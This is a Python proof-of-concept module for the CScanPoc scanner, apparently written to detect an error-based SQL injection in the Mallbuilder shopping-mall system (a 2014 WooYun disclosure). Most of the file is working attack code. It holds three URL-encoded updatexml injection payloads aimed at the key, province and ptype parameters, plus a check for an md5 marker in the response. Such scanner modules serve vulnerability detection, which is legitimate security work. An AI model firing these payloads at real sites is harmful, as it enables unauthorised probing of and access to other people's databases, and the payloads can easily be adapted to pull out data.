# coding: utf-8

from CScanPoc.thirdparty import requests
from CScanPoc import ABPoc, ABVuln, VulnLevel, VulnType
import urllib.request
import urllib.error
import urllib.parse


class Vuln(ABVuln):
    vuln_id = 'Mallbuilder_0001'  # 平台漏洞编号，留空
    name = 'Mallbuilder商城系统 SQL注入'  # 漏洞名称
    level = VulnLevel.HIGH  # 漏洞危害级别
    type = VulnType.INJECTION  # 漏洞类型
    disclosure_date = '2014-10-27'  # 漏洞公布时间
    desc = '''
        Mallbuilder商城系统 ?m=product&s=list&key=, key参数木有过滤，报错注入。
    '''  # 漏洞描述
    ref = 'https://bugs.shuimugan.com/bug/view?bug_no=080751'  # 漏洞来源
    cnvd_id = 'Unknown'  # cnvd漏洞编号
    cve_id = 'Unknown'  # cve编号
    product = 'Mallbuilder'  # 漏洞应用名称
    product_version = 'Unknown'  # 漏洞应用版本


class Poc(ABPoc):
    poc_id = 'd4a8d5e6-e7e8-457f-a5aa-922ee1ff1972'
    author = '47bwy'  # POC编写者
    create_date = '2018-05-18'  # POC创建时间

    def __init__(self):
        super(Poc, self).__init__(Vuln())
        self.option_schema = {
            'properties': {
                'base_path': {
                    'type': 'string',
                    'description': '部署路径',
                    'default': '',
                    '$default_ref': {
                        'property': 'deploy_path'
                    }
                }
            }
        }

    def verify(self):
        self.target = self.target.rstrip(
            '/') + '/' + (self.get_option('base_path').lstrip('/'))
        try:
            self.output.info('开始对 {target} 进行 {vuln} 的扫描'.format(
                target=self.target, vuln=self.vuln))

            # Referer   : http://www.wooyun.org/bugs/wooyun-2014-080751
            payloads = [
                '?m=product&s=list&key=%27%20and%201=updateXml%281,concat%280x5c,md5%283.14%29%29,1%29%23',
                '?m=shop&id=&province=%27%20and%201=updatexml%281,concat%280x5c,md5%283.14%29%29,1%29%23',
                '?m=product&s=list&ptype=0%27%20%20and%201=updatexml%281,concat%280x5c,md5%283.14%29%29,1%29%23'
            ]
            for payload in payloads:
                verify_url = self.target + payload
                req = requests.get(verify_url)

                if req.status_code == 200 and "4beed3b9c4a886067de0e3a094246f7" in req.text:
                    self.output.report(self.vuln, '发现{target}存在{name}漏洞，漏洞地址为{url}'.format(
                        target=self.target, name=self.vuln.name, url=verify_url))

        except Exception as e:
            self.output.info('执行异常{}'.format(e))

    def exploit(self):
        self.verify()


if __name__ == '__main__':
    Poc().run()
